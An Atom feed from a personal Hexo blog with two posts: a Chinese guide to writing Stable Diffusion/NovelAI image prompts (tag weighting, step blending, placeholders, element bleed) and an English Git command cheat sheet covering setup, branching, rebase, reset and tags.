<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Resek&#39;s Kingdom</title>
  
  
  <link href="https://resek4.github.io/atom.xml" rel="self"/>
  
  <link href="https://resek4.github.io/"/>
  <updated>2023-03-31T06:09:54.800Z</updated>
  <id>https://resek4.github.io/</id>
  
  <author>
    <name>Resek4</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>元素法师的修习日志-SD/NovelAI Prompt写法总览</title>
    <link href="https://resek4.github.io/2023/03/31/SD-prompting/"/>
    <id>https://resek4.github.io/2023/03/31/SD-prompting/</id>
    <published>2023-03-30T23:02:00.000Z</published>
    <updated>2023-03-31T06:09:54.800Z</updated>
    
    <content type="html"><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331075834.png" alt="image.png"></p><blockquote><p>平时写tag超过150就会心慌了，之前的极限是不超过250。<br>这次元素堆的有点多，堆tag超过400了，也顺便试试看哪些有冲突。目前完整按照我设想的出图率在5%，良品率在20%左右。<br>其他大部分都是背景设定(虽然效果也不错)。<br>减少一些元素描述会增加出图稳定性(或者你也可以当成词条包来看待 </p></blockquote><span id="more"></span><ul><li>在 WebUI 中，可以通过修改前端的代码，从而修改渲染迭代步数的上限<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331111238.png" alt="image.png"></li></ul><h1 id="Prompt写法"><a href="#Prompt写法" class="headerlink" title="Prompt写法"></a>Prompt写法</h1><h2 id="通法"><a href="#通法" class="headerlink" title="通法"></a>通法</h2><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331085557.png" alt="image.png"></p><h2 id="三段式"><a href="#三段式" class="headerlink" title="三段式"></a>三段式</h2><p>第一段： 画质tag，画风tag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(((masterpiece))), best quality, ultra-detailed, highres, extremely detailed CG, unity <span class="number">8</span>k wallpaper,best illustration, resolution, </span><br></pre></td></tr></table></figure><p>第二段：画面主体，主体强调，主体细节概括。（主体可以是人、事、物、景）画面核心内容，一般提供人数，人物主要特征，主要动作（一般置于人物之前），物体主要特征，主景或景色框架等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">场景（但是因为先后生成关系，需要在场景最前面加上关键人物词条）</span><br><span class="line">(<span class="number">1</span>girls:<span class="number">1.5</span>), castle, ((pumpkin lanterns)), in_ autumn, (bats:<span class="number">1.2</span>), (ghost:<span class="number">1.25</span>), Halloween, </span><br><span class="line"></span><br><span class="line">人物</span><br><span class="line">(<span class="number">1</span>girl),blue eyes,(multicolored_hair+silver hair:<span class="number">1.3</span>+red hair:<span class="number">1.2</span>+purple hair+yellow hair:<span class="number">1.3</span>+green hair:<span class="number">1.3</span>), white wuxia clothes,neck ribbon, beautiful face, </span><br><span class="line"></span><br><span class="line">灵动姿态：vibrant, dynamic Poses, </span><br></pre></td></tr></table></figure><p>第三段：画面场景细节，或人物细节，embedding tag。画面细节内容，整体氛围</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atmosphere, dramatic_ shadow, ray_tracing</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(((masterpiece))), best quality, ultra-detailed, extremely detailed CG unity <span class="number">8</span>k wallpaper,best illustration, an extremely delicate and beautiful,floating,high resolution,</span><br><span class="line"></span><br><span class="line">dynamic angle,dynamic pose,(<span class="number">1</span>girl),blue eyes,(multicolored_hair+silver hair:<span class="number">1.3</span>+red hair:<span class="number">1.2</span>+purple hair+yellow hair:<span class="number">1.3</span>+green hair:<span class="number">1.3</span>), white wuxia clothes,neck ribbon, beautiful face,</span><br><span class="line"></span><br><span class="line">too many drops of water,cloud,twilight, wide shot,watercolor, </span><br></pre></td></tr></table></figure><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230330105928.png" alt="image.png"></p><h2 id="三种描绘方法"><a href="#三种描绘方法" class="headerlink" title="三种描绘方法"></a>三种描绘方法</h2><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331082722.png" alt="image.png"></p><ul><li><em><strong>pitch型咏唱会对画面中不同分立的元素描绘的更加准确</strong></em></li><li><em><strong>自然语言咏唱的效果对于主体从属关系会还愿的更加准确，但是不稳定度却比其他的要高不少</strong></em></li></ul><h2 id="Prompt-语法特性"><a href="#Prompt-语法特性" class="headerlink" title="Prompt 语法特性"></a>Prompt 语法特性</h2><h3 id="放置顺序"><a href="#放置顺序" class="headerlink" title="放置顺序"></a>放置顺序</h3><ul><li>如果将要被描述的主体放在前面，那么 AI 就一定会将前面的元素作为主要描绘对象<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331085043.png" alt="image.png"></li></ul><h3 id="加权"><a href="#加权" class="headerlink" title="加权"></a>加权</h3><ul><li>小括号 <code>()</code> 相当于 1.1 倍权重，多重小括号 <code>(())</code> 即为 1.21倍权重，即为 1.1 倍的叠加</li><li>中括号是 <code>[]</code> 是 0.91 倍权重，相当于是除以了 1.1</li><li>可以直接在词语后面冒号加数字来达到加权目的： <code>(prompt:1.2)</code> </li><li>不一定要给整词加权，也可以部分加权：<code>long black (messy:1.2) hair</code></li></ul><h3 id="融合描绘"><a href="#融合描绘" class="headerlink" title="融合描绘"></a>融合描绘</h3><ul><li>分步描绘：<code>[green hair:red hair flower:0.2]</code></li></ul><p>即前 20% 用 <code>green hair</code> ，后 80% 为 <code>red hair</code> 进行分布融合描绘</p><blockquote><p>可以使用 <code>[A::0.2]</code> ，即为将 A元素 渲染到 20% 进度的时候删除 A元素</p></blockquote><ul><li>循环描绘：<code>a [dog | frog] in lake</code></li></ul><p>即第一步 <code>dog</code> 第二步 <code>frog</code> 第三步再 <code>dog</code> 第四步再 <code>frog</code> 的方式进行描绘渲染，从而达到融合的效果</p><blockquote><p>分步描绘的好处有很多：</p><ol><li>可以隔离元素污染<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331134551.png" alt="image.png"></li><li>可以改善冰原效应，因为渲染某一个主体的时间足够长，就可以使它吸收别的元素的特质<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331134655.png" alt="image.png"></li><li>如果Steps足够的情况下，可以改善局部细节，例如修手<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331134735.png" alt="image.png"></li><li>脚手架法：脚手架法指一些特定的人无法做出特性的动作（诸如此类的），这种情况下，我们可以<em><strong>利用分步渲染，先解决动作的问题，再指定这个人（先画脚手架，再画人）</strong></em>。一般来说，直接描写动作或者是利用tag的隐藏属性都能实现这一点。目前最广泛的应用就是：让人偶再前面部分，后部分根据需要更改为自己想要的元素tag， 从而让自己想要的元素居中。</li></ol></blockquote><h3 id="描绘距离"><a href="#描绘距离" class="headerlink" title="描绘距离"></a>描绘距离</h3><ul><li><p>因为 <code>hair</code> 和 <code>flower</code> 离得很近，同时 <code>flower</code> 的权重又是1.35，AI 则会自动的联想到头发上出现花<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331083238.png" alt="image.png"></p></li><li><p>而如果将两者隔开一定距离，则会断开联想</p></li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331083419.png" alt="image.png"></p><h3 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h3><p>上述的花却出现在了衣服上，如果想要完全不出现，可以加入无意义的占位符，例如：is, that, which, ai is sb（国内用的最多）<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331083756.png" alt="image.png"></p><blockquote><p>同时，因为 WebUI 对于描述 tokens 的分类是 75 个为一组，<em>所以如果想要进行连续描述却到75个的时候，尽量在75个前后加入占位符，以避免连续描述被打断所造成的<strong>元素污染</strong></em></p></blockquote><h3 id="高纯度词内占位符"><a href="#高纯度词内占位符" class="headerlink" title="高纯度词内占位符"></a>高纯度词内占位符</h3><p>在关键词前后加上形如：<code>\</code> <code>*</code> <code>+</code> <code>_</code> 这种占位符，整体画面不会有大变化，但是会在关键词描述的元素上加上细微的区别，<em><strong>同时渲染，细节描写也会更多</strong></em><br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331084129.png" alt="image.png"></p><h3 id="颜文字的妙用"><a href="#颜文字的妙用" class="headerlink" title="颜文字的妙用"></a>颜文字的妙用</h3><p>颜文字的<em><strong>信息密度很高</strong></em>，很少的token就可以表达一大段效果<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331091014.png" alt="image.png"></p><ul><li>可以去这个网站找到好的颜文字表情：<a href="https://www.emojiall.com/zh-hans">Emoji大全 | Emoji表情符号词典 📓 | EmojiAll中文官方网站</a></li></ul><h1 id="AI生成的原理"><a href="#AI生成的原理" class="headerlink" title="AI生成的原理"></a>AI生成的原理</h1><ul><li><a href="https://energy-based-model.github.io/Compositional-Visual-Generation-with-Composable-Diffusion-Models/">Compositional Visual Generation with Composable Diffusion Models</a></li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331092008.png" alt="image.png"></p><p>顺序如下：</p><ol><li>我们输入的词句，会被蓝色的自然语言处理器解析成一个个数字，存进蓝色的数组中。</li><li>这个输入数组会按顺序结合高斯噪声输入到红色的生成器中，生成粗糙的图像。</li><li>将粗糙的图与输入数组重复第二步，对生成的图像进行迭代</li><li>将迭代完的输入黄色的放大器，扩大图像分辨率，使图像细致。</li></ol><p>简述原理参考：<a href="https://www.bilibili.com/read/cv19790550">【AI绘画】完整tags书写思路，从人工智能理论来了解如何绘画 - 哔哩哔哩</a></p><p>所以可以解释以下问题：<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331092252.png" alt="image.png"></p><h1 id="AI生成的特性及污染"><a href="#AI生成的特性及污染" class="headerlink" title="AI生成的特性及污染"></a>AI生成的特性及污染</h1><h2 id="源于训练素材导致的AI自动联想"><a href="#源于训练素材导致的AI自动联想" class="headerlink" title="源于训练素材导致的AI自动联想"></a>源于训练素材导致的AI自动联想</h2><ul><li>如果没有能自行训练模型的能力，从而用的是别人训练的模型，那么很有可能结果会不尽如人意（或者会触发奇怪的反应）</li></ul><ol><li><p>我们想绘制一个女孩手捧着耳环的图片，如果不加以描述，AI在默认情况下一定会生成一个带着耳环的女孩的照片（因为这是正常情况）<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331084948.png" alt="image.png"></p></li><li><p>但是也因为 AI 的联想，有些奇怪的prompt却触发很多意想不到的效果，比方说如下例子中，使用了 <code>Monster Energy</code> （“魔爪”饮料名），AI会引入魔爪的扭曲 logo，从而使画面往扭曲的方向去偏<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331090358.png" alt="image.png"></p></li></ol><h2 id="元素污染"><a href="#元素污染" class="headerlink" title="元素污染"></a>元素污染</h2><ul><li>该 Prompt 中明显使用 <code>white hair</code> 来描述头发，却因为周边的元素污染，导致头发变成金色了<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331110019.png" alt="image.png"><blockquote><p>当然，有利有弊，有一些不好描述的衣物效果也可以通过元素污染来实现</p></blockquote></li></ul><h2 id="元素溢出"><a href="#元素溢出" class="headerlink" title="元素溢出"></a>元素溢出</h2><ul><li>因为画布太大而 prompt 太少，从而导致AI只能将现有元素进行溢出或者重复绘制<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331110311.png" alt="image.png"></li></ul><h2 id="冰原效应（强行占有另一元素的特性）"><a href="#冰原效应（强行占有另一元素的特性）" class="headerlink" title="冰原效应（强行占有另一元素的特性）"></a>冰原效应（强行占有另一元素的特性）</h2><ul><li>例如我们想要生成<em>具有冰背景的同时，主体也带冰元素</em>，很有可能就不能兼得，原因是两者的元素会相互侵占，即便再去加权重也没用<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331110554.png" alt="image.png"></li></ul><h2 id="0级污染"><a href="#0级污染" class="headerlink" title="0级污染"></a>0级污染</h2><p>在普通模型中，<code>Flat chest</code>（平胸）往往和年龄较小的女性联系在一起，从而如果我们生成一个女性并指明平胸，那么很有可能人物的样貌都会产生变化，即<em><strong>0级污染</strong></em><br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331084814.png" alt="image.png"></p><ul><li>比方说：人偶，修女，平胸，这三个词条都存在0级污染</li></ul><h1 id="色彩的实际效果"><a href="#色彩的实际效果" class="headerlink" title="色彩的实际效果"></a>色彩的实际效果</h1><p>色彩词汇并不能完全被ai认知，部分词汇无法表达出应有的效果。但是还是有很多色彩可以被被激活，具体可以参考：</p><ul><li><a href="https://docs.qq.com/slide/DSE1ORVFva01tZWVD">色彩的实际表达效果</a></li></ul><h1 id="img2img"><a href="#img2img" class="headerlink" title="img2img"></a>img2img</h1><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331101016.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;总览&quot;&gt;&lt;a href=&quot;#总览&quot; class=&quot;headerlink&quot; title=&quot;总览&quot;&gt;&lt;/a&gt;总览&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230331075834.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;平时写tag超过150就会心慌了，之前的极限是不超过250。&lt;br&gt;这次元素堆的有点多，堆tag超过400了，也顺便试试看哪些有冲突。目前完整按照我设想的出图率在5%，良品率在20%左右。&lt;br&gt;其他大部分都是背景设定(虽然效果也不错)。&lt;br&gt;减少一些元素描述会增加出图稳定性(或者你也可以当成词条包来看待 &lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="HackStyle" scheme="https://resek4.github.io/categories/HackStyle/"/>
    
    
  </entry>
  
  <entry>
    <title>GIT:A boon for open-source developers who need to collaborate on code.</title>
    <link href="https://resek4.github.io/2023/01/10/Git/"/>
    <id>https://resek4.github.io/2023/01/10/Git/</id>
    <published>2023-01-09T16:00:00.000Z</published>
    <updated>2023-03-22T15:22:47.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Local-Git-Config"><a href="#Local-Git-Config" class="headerlink" title="Local Git Config"></a>Local Git Config</h1><h2 id="Create-the-Encrypted-connection"><a href="#Create-the-Encrypted-connection" class="headerlink" title="Create the Encrypted connection"></a>Create the Encrypted connection</h2><ul><li>Generate the SSH key<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;[Email on Github]&quot;</span></span><br></pre></td></tr></table></figure></li><li>Put the <em><strong>public key</strong></em>(<code>.pub</code>) to the GitHub settings</li><li>Verify the connection’s available</li></ul><h2 id="Initial-the-Git-configuration"><a href="#Initial-the-Git-configuration" class="headerlink" title="Initial the Git configuration"></a>Initial the Git configuration</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name  <span class="string">&quot;name&quot;</span> //你的GitHub登陆名</span><br><span class="line">git config --global user.email <span class="string">&quot;123@126.com&quot;</span> //你的GitHub注册邮箱</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="Optional-Git-configurations"><a href="#Optional-Git-configurations" class="headerlink" title="(Optional) Git configurations"></a>(Optional) Git configurations</h2><h3 id="Git-proxy-settings"><a href="#Git-proxy-settings" class="headerlink" title="Git proxy settings"></a>Git proxy settings</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># View all of the proxy settings</span></span><br><span class="line">git config --global https.proxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the proxy</span></span><br><span class="line">git config --global http.proxy [http://127.0.0.1:1080](http://127.0.0.1:1080/)</span><br><span class="line">git config --global https.proxy [https://127.0.0.1:1080](https://127.0.0.1:1080/)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Cancel the proxy settings</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br></pre></td></tr></table></figure><h3 id="Ignore-the-files"><a href="#Ignore-the-files" class="headerlink" title="Ignore the files"></a>Ignore the files</h3><ul><li>Add the filename which should be ignored to the <code>.gitignore</code> file.</li></ul><blockquote><p>However, the files’ names will also be exposed in the <code>.gitignore</code> file. Therefore, if we want to ignore the files, we should add the file name(or the pathname) to the <code>.git/info/exclude</code> file.</p></blockquote><h3 id><a href="#" class="headerlink" title></a></h3><h1 id="Normal-develop"><a href="#Normal-develop" class="headerlink" title="Normal develop"></a>Normal develop</h1><h2 id="Concept"><a href="#Concept" class="headerlink" title="Concept"></a>Concept</h2><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230110113237.png" alt="image.png"></p><h2 id="Workflow"><a href="#Workflow" class="headerlink" title="Workflow"></a>Workflow</h2><blockquote><p>If you want to upload some codes to Github, you need to <em>create a repository on Github</em> before you use the git commands below.</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Simplist git upload flow</span></span><br><span class="line">git init</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Something&quot;</span> &gt;&gt; README.md</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m <span class="string">&quot;something&quot;</span></span><br><span class="line">git remote add origin [ssh@your.repo]</span><br><span class="line">git branch -M main <span class="comment"># -M specifies the branch is a main branch</span></span><br><span class="line">git push -u origin main  <span class="comment"># -u makes the after git push no need to specify the specific remote address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># View the git log</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># View the git status</span></span><br><span class="line">git status</span><br></pre></td></tr></table></figure><h1 id="Open-Source-software-developing-flow"><a href="#Open-Source-software-developing-flow" class="headerlink" title="Open Source software developing flow"></a>Open Source software developing flow</h1><h2 id="Git-Flow"><a href="#Git-Flow" class="headerlink" title="Git Flow"></a>Git Flow</h2><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230110113256.png" alt="image.png"></p><h2 id="git-branch"><a href="#git-branch" class="headerlink" title="git branch"></a>git branch</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Checkout all of the branches</span></span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"><span class="comment"># Delte a branch</span></span><br><span class="line">git branch -d [branch_name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Switching the current branch</span></span><br><span class="line">git checkout [branch_name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a new branch and Switch to it</span></span><br><span class="line">git checkout -b [branch_name]</span><br></pre></td></tr></table></figure><h2 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Add a commit about this changing</span></span><br><span class="line">git commit <span class="string">&quot;[something]&quot;</span></span><br><span class="line"><span class="comment"># Edit the added commit contents but hasn&#x27;t pushed to the remote</span></span><br><span class="line">git commit --amend </span><br></pre></td></tr></table></figure><h2 id="git-rebase"><a href="#git-rebase" class="headerlink" title="git rebase"></a>git rebase</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Rebase the current branch to the other branch&#x27;s lastest version</span></span><br><span class="line">git rebase [branch_name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># If there&#x27;s a conflict when you&#x27;re branching, continue the operation(you should solve the conflict first)</span></span><br><span class="line">git rebase --<span class="built_in">continue</span> </span><br></pre></td></tr></table></figure><h2 id="git-merge"><a href="#git-merge" class="headerlink" title="git merge"></a>git merge</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Merge another branch&#x27;s lastest version to the current branch</span></span><br><span class="line">git merge [branch_name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># combine all of the commits to one commit, and merge it to the current branch</span></span><br><span class="line">git merge --squash [branch_name]</span><br></pre></td></tr></table></figure><h2 id="git-revert"><a href="#git-revert" class="headerlink" title="git revert"></a>git revert</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Revert a single operation by commit_id</span></span><br><span class="line">git revert [commit_id]</span><br></pre></td></tr></table></figure><h2 id="git-reset"><a href="#git-reset" class="headerlink" title="git reset"></a>git reset</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Reset your local git to a history point</span></span><br><span class="line">git reset [file]|[<span class="built_in">history</span> point]</span><br><span class="line">git reset --soft [file]|[<span class="built_in">history</span> point]</span><br><span class="line">git reset --mixed [file]|[<span class="built_in">history</span> point] <span class="comment"># Defalut</span></span><br><span class="line">git reset --hard [file]|[<span class="built_in">history</span> point]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reset the local git to the previous version, every ^ means a previous version</span></span><br><span class="line">git reset HEAD^ </span><br><span class="line">git reset HEAD~1</span><br></pre></td></tr></table></figure><h2 id="git-tag"><a href="#git-tag" class="headerlink" title="git tag"></a>git tag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># View all of the tags</span></span><br><span class="line">git tag -n</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use git log --decorate to confirm the tag&#x27;s belonging</span></span><br><span class="line">git <span class="built_in">log</span> --decorate</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a tag to a commit at your local git</span></span><br><span class="line">git tag [tag_name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a tag containing the content</span></span><br><span class="line">git tag -am [content] [tag_name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Push the tags</span></span><br><span class="line">git push origin --tags <span class="comment"># Push all of the tags</span></span><br><span class="line">git push origin tag [tag_name] <span class="comment"># Push a certain tag</span></span><br></pre></td></tr></table></figure><h2 id="git-restore"><a href="#git-restore" class="headerlink" title="git restore"></a>git restore</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Recover a file but not adding to the stage</span></span><br><span class="line">git restore [file_name] <span class="comment"># or we can use &quot;git checkout [file_name]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Revoke the file adding from the stage</span></span><br><span class="line">git restore --stage [file_name]</span><br></pre></td></tr></table></figure><h2 id="git-cherry-pick"><a href="#git-cherry-pick" class="headerlink" title="git cherry-pick"></a>git cherry-pick</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Merge another branch&#x27;s certain commit to the current branch</span></span><br><span class="line">git cherry-pick [commit_id]|[branch_name]</span><br></pre></td></tr></table></figure><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><h2 id="The-difference-between-merge-x2F-rebase-x2F-squash"><a href="#The-difference-between-merge-x2F-rebase-x2F-squash" class="headerlink" title="The difference between merge&#x2F;rebase&#x2F;squash"></a>The difference between merge&#x2F;rebase&#x2F;squash</h2><ul><li>The common <code>merge</code> could lead to the situation<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230106031835.png" alt="image.png"></li></ul><p>If we use different parameters rather than the common one.<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230107061052.png" alt="image.png"></p><p><code>--squash</code> could combine all of the commits to be a single one, which makes the git timeline looks better.</p><ul><li><em><strong>Use the <code>rebase</code> as possible as we can</strong></em>(except the public branch)<blockquote><p>Though the <code>merge</code> is more convenient to use, however, <em>if we always use squash to merge the branches, the author of the main branch will be full of the name of the maintenance personnel</em></p></blockquote></li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230105151533.png" alt="image.png"></p><ul><li><code>merge</code> should be used at the main branch, and <code>rebase</code> should be used at the feature branch</li></ul><h2 id="The-difference-between-revert-x2F-reset"><a href="#The-difference-between-revert-x2F-reset" class="headerlink" title="The difference between revert&#x2F;reset"></a>The difference between revert&#x2F;reset</h2><ul><li>The public branch can not tolerate the “Rollback” thing, therefore the public branch mustn’t use the <code>reset</code> command. We can use the <code>revert</code> instead of it.</li><li><em><code>revert</code> will add a new commit</em> when we use it to revoke an operation.</li><li>When we use the <code>reset</code> command to roll back to the previous git point, it is necessary to use the <code>push -f</code> to force push our local git to the remote side.</li><li>The remote git side can not tolerate any differences between the remote and the local git, so whether we use the <code>reset</code> or the <code>rebase</code> command, we should <code>push -f</code>.</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Local-Git-Config&quot;&gt;&lt;a href=&quot;#Local-Git-Config&quot; class=&quot;headerlink&quot; title=&quot;Local Git Config&quot;&gt;&lt;/a&gt;Local Git Config&lt;/h1&gt;&lt;h2 id=&quot;Create-the-Encrypted-connection&quot;&gt;&lt;a href=&quot;#Create-the-Encrypted-connection&quot; class=&quot;headerlink&quot; title=&quot;Create the Encrypted connection&quot;&gt;&lt;/a&gt;Create the Encrypted connection&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Generate the SSH key&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssh-keygen -t rsa -C &lt;span class=&quot;string&quot;&gt;&amp;quot;[Email on Github]&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;Put the &lt;em&gt;&lt;strong&gt;public key&lt;/strong&gt;&lt;/em&gt;(&lt;code&gt;.pub&lt;/code&gt;) to the GitHub settings&lt;/li&gt;
&lt;li&gt;Verify the connection’s available&lt;/li&gt;
&lt;/ul&gt;
